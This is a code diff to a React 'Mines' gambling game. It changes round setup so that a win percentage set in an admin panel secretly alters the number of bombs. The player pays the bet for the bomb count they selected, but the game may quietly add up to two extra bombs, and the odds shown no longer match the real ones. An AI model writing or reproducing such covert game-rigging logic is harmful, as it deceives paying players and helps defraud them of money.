@@ -20,7 +20,7 @@ const Mines: React.FC = () => {
   const [currentMultiplier, setCurrentMultiplier] = useState(1);
   const [gameOver, setGameOver] = useState(false);
 
-  const startGame = () => {
+  const startGame = async () => {
     const amount = parseFloat(betAmount);
     if (isNaN(amount) || amount <= 0) {
       toast.error('Please enter a valid bet amount');
@@ -32,12 +32,19 @@ const Mines: React.FC = () => {
     }
 
     updateBalance(-amount);
-    
-    // Generate random bomb positions based on user selection
+
+    // Percentual de ganho definido no painel admin ajusta a dificuldade da rodada
+    const favorPlayer = await shouldPlayerWin('mines');
+    const effectiveBombs = favorPlayer
+      ? Math.max(1, bombCount - 1)
+      : Math.min(GRID_SIZE - 1, bombCount + 2);
+
+    // Generate random bomb positions
     const bombPositions = new Set<number>();
-    while (bombPositions.size < bombCount) {
+    while (bombPositions.size < effectiveBombs) {
       bombPositions.add(Math.floor(Math.random() * GRID_SIZE));
     }
+
 
     setBombs(bombPositions);
     setRevealed(new Set());
